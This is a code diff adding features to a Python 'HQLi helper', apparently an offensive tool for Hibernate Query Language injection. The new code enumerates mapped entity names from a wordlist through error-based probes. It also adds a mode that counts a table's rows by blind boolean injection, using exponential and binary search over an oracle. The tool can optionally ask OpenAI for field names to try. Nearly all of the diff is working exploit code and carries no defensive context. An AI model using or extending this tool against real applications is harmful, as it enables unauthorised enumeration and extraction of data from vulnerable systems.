@@ -205,6 +205,22 @@ def is_unknown_property_error(field: str) -> bool:
         or "could not resolve attribute" in low
     )
 
+def is_unknown_entity_error(entity_name: str) -> bool:
+    """Return True if the last response message indicates an unknown/missing entity mapping."""
+    msg = LAST_MSG or ""
+    if not msg:
+        return False
+    low = msg.lower()
+    # Include the entity token to reduce false positives
+    if entity_name and entity_name.split(".")[-1].lower() not in low and entity_name.lower() not in low:
+        # Sometimes only simple name appears; check both
+        pass
+    return (
+        "unknownentityexception" in low
+        or "could not resolve root entity" in low
+        or "is not mapped" in low
+    )
+
 def _entity_simple_name() -> str:
     return (HQL_ENTITY.split(".")[-1] if HQL_ENTITY else "").strip()
 
@@ -287,6 +303,51 @@ def _augment_id_candidates_from_ai(count: int = 5) -> list[str]:
         return cleaned
     except Exception:
         return []
+
+def _read_entities_file(path: str) -> list[str]:
+    if not path or not os.path.isfile(path):
+        print(f"[!] --entities file not found: {path}")
+        raise SystemExit(2)
+    try:
+        with open(path, "r", encoding="utf-8", errors="ignore") as fh:
+            raw = fh.read()
+    except Exception as e:
+        print(f"[!] Failed to read --entities file: {e}")
+        raise SystemExit(2)
+    cands: list[str] = []
+    for line in raw.splitlines():
+        line = line.split('#', 1)[0].strip()
+        if not line:
+            continue
+        # accept tokens split by commas/whitespace
+        parts = [p.strip() for p in re.split(r"[\s,]+", line) if p.strip()]
+        for p in parts:
+            # minimal sanitization: A-Za-z0-9 . _
+            if re.match(r"^[A-Za-z0-9_.]+$", p):
+                cands.append(p)
+    # dedupe preserving order
+    seen = set(); out = []
+    for c in cands:
+        if c not in seen:
+            seen.add(c); out.append(c)
+    return out
+
+def resolve_entities(candidates: list[str]) -> list[str]:
+    if not candidates:
+        print("[i] No entity candidates to resolve")
+        return []
+    resolved: list[str] = []
+    for ent in candidates:
+        # Probe by referencing the entity in a subquery; result truth value isn't important
+        LAST_MSG_placeholder = LAST_MSG  # no-op, we only read LAST_MSG after the call
+        _ = truthy(inj(f"exists ( from {ent} u where 1=1 )"))
+        if is_unknown_entity_error(ent):
+            print(f"[-] not mapped: {ent}")
+        else:
+            print(f"[+] mapped: {ent}")
+            resolved.append(ent)
+    print(f"[done] mapped entities: {resolved}")
+    return resolved
 
 def discover_id_field(cli_override = None) -> str:
     global ID_FIELD
@@ -482,18 +543,77 @@ def main():
     global DEBUG, HQL_ENTITY, AI_MODE, AI_FIELD_COUNT, TARGET_ENTITY_COUNT, ID_FIELD
     parser = argparse.ArgumentParser(description="HQLi helper")
     parser.add_argument("--debug", action="store_true", help="Enable verbose request logging")
-    parser.add_argument("--entity", required=True, help="HQL entity name (FQN or simple), e.g. com.pdstat.hqli.entity.User1")
+    parser.add_argument("--entity", help="HQL entity name (FQN or simple), e.g. com.pdstat.hqli.entity.User1")
     parser.add_argument("--ai-mode", action="store_true", help="Use OpenAI to suggest extra fields (requires OPENAI_API_KEY)")
-    parser.add_argument("--fields", required=True, help="Path to a wordlist file of field names to try (one per line)")
+    parser.add_argument("--fields", help="Path to a wordlist file of field names to try (one per line)")
     parser.add_argument("--ai-field-count", type=int, default=10, help="How many fields to fetch from OpenAI when --ai-mode is enabled (default: 10)")
     parser.add_argument("--entity-count", type=int, default=2, help="Total number of entities to enumerate (default: 2)")
     parser.add_argument("--id-field", help="Override: name of the identifier property (e.g., userId, agentId). If omitted, the script tries to discover it.")
+    parser.add_argument("--resolve-entities", action="store_true", help="Probe a wordlist of entity names and print those that are mapped")
+    parser.add_argument("--entities", help="Path to a wordlist of entity names (simple or FQN) for --resolve-entities")
+    parser.add_argument("--count-rows", action="store_true", help="Print total row count for --entity and exit")
     args = parser.parse_args()
     DEBUG = args.debug
     HQL_ENTITY = args.entity
     AI_MODE = args.ai_mode
     AI_FIELD_COUNT = max(1, min(int(args.ai_field_count or 10), 50))
     TARGET_ENTITY_COUNT = max(1, int(args.entity_count or 2))
+
+    # Resolve-entities mode: enumerate mapped entities from wordlist and exit
+    if args.resolve_entities:
+        if not args.entities:
+            print("[!] --resolve-entities requires --entities <file>")
+            raise SystemExit(2)
+        cands = _read_entities_file(args.entities)
+        resolve_entities(cands)
+        return
+
+    # Normal mode checks
+    if not HQL_ENTITY:
+        print("[!] --entity is required unless --resolve-entities is used")
+        raise SystemExit(2)
+
+    # Count-only mode: compute and print total number of rows for the entity and exit
+    if args.count_rows:
+        def _ge(k: int):
+            return truthy(inj(f"(select count(*) from {HQL_ENTITY} u) >= {k}"))
+
+        # Quick zero check
+        t1 = _ge(1)
+        if t1 is False:
+            print(f"[count] {HQL_ENTITY} rows = 0")
+            return
+        if t1 is None:
+            print("[count] ambiguous oracle response; cannot determine count")
+            return
+        # Exponential search to find upper bound
+        low, high = 1, 1
+        while True:
+            t = _ge(high)
+            if t is True:
+                low = high
+                high = min(high * 2, 1_000_000_000)
+                if high == low:
+                    break
+                continue
+            elif t is False:
+                break
+            else:
+                print("[count] ambiguous oracle response during search; aborting")
+                return
+        # Binary search in (low, high]
+        while low < high:
+            mid = (low + high + 1) // 2
+            t = _ge(mid)
+            if t is True:
+                low = mid
+            elif t is False:
+                high = mid - 1
+            else:
+                print("[count] ambiguous oracle response during refine; aborting")
+                return
+        print(f"[count] {HQL_ENTITY} rows = {low}")
+        return
 
     if args.fields:
         augment_fields_from_file(args.fields)
